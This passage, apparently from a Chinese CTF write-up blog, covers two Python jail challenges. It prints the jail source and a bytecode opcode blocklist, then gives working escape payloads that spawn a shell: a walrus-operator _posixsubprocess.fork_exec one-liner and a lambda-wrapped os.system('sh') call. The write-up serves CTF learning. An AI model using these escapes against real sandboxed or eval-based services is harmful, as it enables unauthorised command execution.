    <a href="#calc_jail_beginner_level61" class="header-mark"></a>calc_jail_beginner_level6.1</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  _                _                           _       _ _   _                _   __
</span></span><span class="line"><span class="cl"> | |              (_)                         (_)     (_) | | |              | | / /
</span></span><span class="line"><span class="cl"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |/ /_
</span></span><span class="line"><span class="cl"> | &#39;_ \ / _ \/ _` | | &#39;_ \| &#39;_ \ / _ \ &#39;__|   | |/ _` | | | | |/ _ \ \ / / _ \ | &#39;_ \
</span></span><span class="line"><span class="cl"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ | (_) |
</span></span><span class="line"><span class="cl"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|\___/
</span></span><span class="line"><span class="cl">              __/ |                          _/ |
</span></span><span class="line"><span class="cl">             |___/                          |__/                                                                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Welcome to the python jail
</span></span><span class="line"><span class="cl">Let&#39;s have an beginner jail of calc
</span></span><span class="line"><span class="cl">Enter your expression and I will evaluate it for you.
</span></span><span class="line"><span class="cl">White list of audit hook ===&gt; builtins.input,builtins.input/result,exec,compile
</span></span><span class="line"><span class="cl">Some code of python jail:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    dict_global = dict()
</span></span><span class="line"><span class="cl">    input_code = input(&#34;&gt; &#34;)
</span></span><span class="line"><span class="cl">    complie_code = compile(input_code, &#39;&lt;string&gt;&#39;, &#39;single&#39;)
</span></span><span class="line"><span class="cl">    exec(complie_code, dict_global)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">&gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用海象运算符</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">[</span><span class="n">os</span> <span class="p">:</span><span class="o">=</span> <span class="n">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">),</span> <span class="n">_posixsubprocess</span> <span class="p">:</span><span class="o">=</span> <span class="n">__loader__</span><span class="o">.</span><span class="n">load_module</span><span class="p">(</span><span class="s1">&#39;_posixsubprocess&#39;</span><span class="p">),</span> <span class="n">_posixsubprocess</span><span class="o">.</span><span class="n">fork_exec</span><span class="p">([</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="n">True</span><span class="p">,</span> <span class="p">(),</span> <span class="n">None</span><span class="p">,</span> <span class="n">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">pipe</span><span class="p">()),</span> <span class="n">False</span><span class="p">,</span> <span class="n">False</span><span class="p">,</span> <span class="n">None</span><span class="p">,</span> <span class="n">None</span><span class="p">,</span> <span class="n">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">None</span><span class="p">)]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>但是起来shell会立刻断掉</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="p">[</span><span class="n">os</span> <span class="o">:=</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">),</span> <span class="n">itertools</span> <span class="o">:=</span> <span class="n">__loader__</span><span class="o">.</span><span class="n">load_module</span><span class="p">(</span><span class="s1">&#39;itertools&#39;</span><span class="p">),</span> <span class="n">_posixsubprocess</span> <span class="o">:=</span> <span class="n">__loader__</span><span class="o">.</span><span class="n">load_module</span><span class="p">(</span><span class="s1">&#39;_posixsubprocess&#39;</span><span class="p">),</span> <span class="p">[</span><span class="n">_posixsubprocess</span><span class="o">.</span><span class="n">fork_exec</span><span class="p">([</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="p">[</span><span class="sa">b</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">],</span> <span class="kc">True</span><span class="p">,</span> <span class="p">(),</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">*</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">pipe</span><span class="p">()),</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">False</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">count</span><span class="p">(</span><span class="mi">0</span><span class="p">)]]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241014163350018.png?imageSlim" title="image-20241014163350018" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241014163350018.png?imageSlim">
        <img
            
            loading="lazy"
            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241014163350018.png?imageSlim"
            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241014163350018.png?imageSlim, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241014163350018.png?imageSlim 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20241014163350018.png?imageSlim 2x"
            sizes="auto"
            alt="image-20241014163350018">
    </a></figure></p>
<p>手段也是越来越离谱</p>
<p><figure><a class="lightgallery" href="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241014163427058.png" title="image-20241014163427058" data-thumbnail="C:\Users\scofi\AppData\Roaming\Typora\typora-user-images\image-20241014163427058.png">
        <img
            
            loading="lazy"
            src="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241014163427058.png"
            srcset="C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241014163427058.png, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241014163427058.png 1.5x, C:%5cUsers%5cscofi%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20241014163427058.png 2x"
            sizes="auto"
            alt="image-20241014163427058">
    </a></figure></p>
<h3 id="sfe-safeeval" class="headerLink">
    <a href="#sfe-safeeval" class="header-mark"></a>s@Fe safeeval</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">Warning</span><span class="p">:</span> <span class="n">_curses</span><span class="o">.</span><span class="n">error</span><span class="p">:</span> <span class="n">setupterm</span><span class="p">:</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">find</span> <span class="n">terminfo</span> <span class="n">database</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Terminal</span> <span class="n">features</span> <span class="n">will</span> <span class="ow">not</span> <span class="n">be</span> <span class="n">available</span><span class="o">.</span>  <span class="n">Consider</span> <span class="n">setting</span> <span class="n">TERM</span> <span class="n">variable</span> <span class="n">to</span> <span class="n">your</span> <span class="n">current</span> <span class="n">terminal</span> <span class="n">name</span> <span class="p">(</span><span class="ow">or</span> <span class="n">xterm</span><span class="p">)</span><span class="o">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">              <span class="n">______</span>                <span class="n">__</span>                     <span class="n">_</span>
</span></span><span class="line"><span class="cl">        <span class="n">____</span> <span class="o">|</span>  <span class="n">____</span><span class="o">|</span>              <span class="o">/</span> <span class="n">_</span><span class="o">|</span>                   <span class="o">|</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl">  <span class="n">___</span>  <span class="o">/</span> <span class="n">__</span> \<span class="o">|</span> <span class="o">|</span><span class="n">__</span> <span class="n">___</span>   <span class="n">___</span>  <span class="n">__</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span><span class="n">_</span> <span class="n">___</span>  <span class="n">_____</span>   <span class="n">____</span> <span class="n">_</span><span class="o">|</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"> <span class="o">/</span> <span class="n">__</span><span class="o">|/</span> <span class="o">/</span> <span class="n">_</span><span class="err">`</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span> <span class="n">_</span> \ <span class="o">/</span> <span class="n">__</span><span class="o">|/</span> <span class="n">_</span><span class="err">`</span> <span class="o">|</span>  <span class="n">_</span><span class="o">/</span> <span class="n">_</span> \<span class="o">/</span> <span class="n">_</span> \ \ <span class="o">/</span> <span class="o">/</span> <span class="n">_</span><span class="err">`</span> <span class="o">|</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"> \<span class="n">__</span> \ <span class="o">|</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span> <span class="o">|</span>  <span class="n">__</span><span class="o">/</span> \<span class="n">__</span> \ <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">||</span>  <span class="n">__</span><span class="o">/</span>  <span class="n">__</span><span class="o">/</span>\ <span class="n">V</span> <span class="o">/</span> <span class="p">(</span><span class="n">_</span><span class="o">|</span> <span class="o">|</span> <span class="o">|</span>
</span></span><span class="line"><span class="cl"> <span class="o">|</span><span class="n">___</span><span class="o">/</span>\ \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>  \<span class="n">___</span><span class="o">|</span> <span class="o">|</span><span class="n">___</span><span class="o">/</span>\<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span> \<span class="n">___</span><span class="o">|</span>\<span class="n">___</span><span class="o">|</span> \<span class="n">_</span><span class="o">/</span> \<span class="n">__</span><span class="p">,</span><span class="n">_</span><span class="o">|</span><span class="n">_</span><span class="o">|</span>
</span></span><span class="line"><span class="cl">       \<span class="n">____</span><span class="o">/</span>                                                                                                           
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Turing</span> <span class="n">s</span><span class="err">@</span><span class="n">Fe</span> <span class="n">mode</span><span class="p">:</span> <span class="n">on</span>
</span></span><span class="line"><span class="cl"><span class="n">Black</span> <span class="n">List</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;POP_TOP&#39;</span><span class="p">,</span><span class="s1">&#39;ROT_TWO&#39;</span><span class="p">,</span><span class="s1">&#39;ROT_THREE&#39;</span><span class="p">,</span><span class="s1">&#39;ROT_FOUR&#39;</span><span class="p">,</span><span class="s1">&#39;DUP_TOP&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;BUILD_LIST&#39;</span><span class="p">,</span><span class="s1">&#39;BUILD_MAP&#39;</span><span class="p">,</span><span class="s1">&#39;BUILD_TUPLE&#39;</span><span class="p">,</span><span class="s1">&#39;BUILD_SET&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;BUILD_CONST_KEY_MAP&#39;</span><span class="p">,</span> <span class="s1">&#39;BUILD_STRING&#39;</span><span class="p">,</span><span class="s1">&#39;LOAD_CONST&#39;</span><span class="p">,</span><span class="s1">&#39;RETURN_VALUE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;STORE_SUBSCR&#39;</span><span class="p">,</span> <span class="s1">&#39;STORE_MAP&#39;</span><span class="p">,</span><span class="s1">&#39;LIST_TO_TUPLE&#39;</span><span class="p">,</span> <span class="s1">&#39;LIST_EXTEND&#39;</span><span class="p">,</span> <span class="s1">&#39;SET_UPDATE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;DICT_UPDATE&#39;</span><span class="p">,</span> <span class="s1">&#39;DICT_MERGE&#39;</span><span class="p">,</span><span class="s1">&#39;UNARY_POSITIVE&#39;</span><span class="p">,</span><span class="s1">&#39;UNARY_NEGATIVE&#39;</span><span class="p">,</span><span class="s1">&#39;UNARY_NOT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;UNARY_INVERT&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_POWER&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_MULTIPLY&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_DIVIDE&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_FLOOR_DIVIDE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;BINARY_TRUE_DIVIDE&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_MODULO&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_ADD&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_SUBTRACT&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_LSHIFT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;BINARY_RSHIFT&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_AND&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_XOR&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_OR&#39;</span><span class="p">,</span><span class="s1">&#39;MAKE_FUNCTION&#39;</span><span class="p">,</span> <span class="s1">&#39;CALL_FUNCTION&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">some</span> <span class="n">code</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">import</span> <span class="n">os</span>
</span></span><span class="line"><span class="cl">    <span class="n">import</span> <span class="n">sys</span>
</span></span><span class="line"><span class="cl">    <span class="n">import</span> <span class="n">traceback</span>
</span></span><span class="line"><span class="cl">    <span class="n">import</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">safeeval</span> <span class="n">as</span> <span class="n">safeeval</span>
</span></span><span class="line"><span class="cl">    <span class="n">input_data</span> <span class="o">=</span> <span class="n">input</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">expr</span><span class="p">(</span><span class="n">input_data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">expr</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">TURING_PROTECT_SAFE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">m</span> <span class="o">=</span> <span class="n">safeeval</span><span class="o">.</span><span class="n">test_expr</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">blocklist_codes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">eval</span><span class="p">(</span><span class="n">m</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">safeeval</span><span class="o">.</span><span class="n">expr</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>基于代码字节码的操作码来拦截</p>
<p>无法直接用<code>__import__</code>。类似地，也没法用<code>__builtins__</code>这些变量。</p>
<p>用lambda表达式包裹起一句话RCE：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(lambda: __import__(&#39;os&#39;).system(&#39;sh&#39;))()
</span></span></code></pre></td></tr></table>
</div>
</div><p>顺便查看一波源代码</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span><span class="lnt">88
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">os</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">sys</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">traceback</span>
</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">pwnlib</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">safeeval</span> <span class="n">as</span> <span class="n">safeeval</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># https://github.com/Gallopsled/pwntools/blob/ef698d4562024802be5cc3e2fa49333c70a96662/pwnlib/util/safeeval.py#L3</span>
</span></span><span class="line"><span class="cl"><span class="n">_const_codes</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;POP_TOP&#39;</span><span class="p">,</span><span class="s1">&#39;ROT_TWO&#39;</span><span class="p">,</span><span class="s1">&#39;ROT_THREE&#39;</span><span class="p">,</span><span class="s1">&#39;ROT_FOUR&#39;</span><span class="p">,</span><span class="s1">&#39;DUP_TOP&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;BUILD_LIST&#39;</span><span class="p">,</span><span class="s1">&#39;BUILD_MAP&#39;</span><span class="p">,</span><span class="s1">&#39;BUILD_TUPLE&#39;</span><span class="p">,</span><span class="s1">&#39;BUILD_SET&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;BUILD_CONST_KEY_MAP&#39;</span><span class="p">,</span> <span class="s1">&#39;BUILD_STRING&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;LOAD_CONST&#39;</span><span class="p">,</span><span class="s1">&#39;RETURN_VALUE&#39;</span><span class="p">,</span><span class="s1">&#39;STORE_SUBSCR&#39;</span><span class="p">,</span> <span class="s1">&#39;STORE_MAP&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;LIST_TO_TUPLE&#39;</span><span class="p">,</span> <span class="s1">&#39;LIST_EXTEND&#39;</span><span class="p">,</span> <span class="s1">&#39;SET_UPDATE&#39;</span><span class="p">,</span> <span class="s1">&#39;DICT_UPDATE&#39;</span><span class="p">,</span> <span class="s1">&#39;DICT_MERGE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">_expr_codes</span> <span class="o">=</span> <span class="n">_const_codes</span> <span class="o">+</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;UNARY_POSITIVE&#39;</span><span class="p">,</span><span class="s1">&#39;UNARY_NEGATIVE&#39;</span><span class="p">,</span><span class="s1">&#39;UNARY_NOT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;UNARY_INVERT&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_POWER&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_MULTIPLY&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;BINARY_DIVIDE&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_FLOOR_DIVIDE&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_TRUE_DIVIDE&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;BINARY_MODULO&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_ADD&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_SUBTRACT&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;BINARY_LSHIFT&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_RSHIFT&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_AND&#39;</span><span class="p">,</span><span class="s1">&#39;BINARY_XOR&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;BINARY_OR&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">blocklist_codes</span> <span class="o">=</span> <span class="n">_expr_codes</span> <span class="o">+</span> <span class="p">[</span><span class="s1">&#39;MAKE_FUNCTION&#39;</span><span class="p">,</span> <span class="s1">&#39;CALL_FUNCTION&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">TURING_PROTECT_SAFE</span> <span class="o">=</span> <span class="n">True</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">banned</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">    [
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;POP_TOP&#39;,&#39;ROT_TWO&#39;,&#39;ROT_THREE&#39;,&#39;ROT_FOUR&#39;,&#39;DUP_TOP&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;BUILD_LIST&#39;,&#39;BUILD_MAP&#39;,&#39;BUILD_TUPLE&#39;,&#39;BUILD_SET&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;BUILD_CONST_KEY_MAP&#39;, &#39;BUILD_STRING&#39;,&#39;LOAD_CONST&#39;,&#39;RETURN_VALUE&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;STORE_SUBSCR&#39;, &#39;STORE_MAP&#39;,&#39;LIST_TO_TUPLE&#39;, &#39;LIST_EXTEND&#39;, &#39;SET_UPDATE&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;DICT_UPDATE&#39;, &#39;DICT_MERGE&#39;,&#39;UNARY_POSITIVE&#39;,&#39;UNARY_NEGATIVE&#39;,&#39;UNARY_NOT&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;UNARY_INVERT&#39;,&#39;BINARY_POWER&#39;,&#39;BINARY_MULTIPLY&#39;,&#39;BINARY_DIVIDE&#39;,&#39;BINARY_FLOOR_DIVIDE&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;BINARY_TRUE_DIVIDE&#39;,&#39;BINARY_MODULO&#39;,&#39;BINARY_ADD&#39;,&#39;BINARY_SUBTRACT&#39;,&#39;BINARY_LSHIFT&#39;,
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;BINARY_RSHIFT&#39;,&#39;BINARY_AND&#39;,&#39;BINARY_XOR&#39;,&#39;BINARY_OR&#39;,&#39;MAKE_FUNCTION&#39;, &#39;CALL_FUNCTION&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">    ]
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">    import os
</span></span></span><span class="line"><span class="cl"><span class="s1">    import sys
</span></span></span><span class="line"><span class="cl"><span class="s1">    import traceback
</span></span></span><span class="line"><span class="cl"><span class="s1">    import pwnlib.util.safeeval as safeeval
</span></span></span><span class="line"><span class="cl"><span class="s1">    input_data = input(&#39;&gt; &#39;)
</span></span></span><span class="line"><span class="cl"><span class="s1">    print(expr(input_data))
</span></span></span><span class="line"><span class="cl"><span class="s1">    def expr(n):
</span></span></span><span class="line"><span class="cl"><span class="s1">        if TURING_PROTECT_SAFE:
</span></span></span><span class="line"><span class="cl"><span class="s1">            m = safeeval.test_expr(n, blocklist_codes)
</span></span></span><span class="line"><span class="cl"><span class="s1">            return eval(m)
</span></span></span><span class="line"><span class="cl"><span class="s1">        else:
</span></span></span><span class="line"><span class="cl"><span class="s1">            return safeeval.expr(n)
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
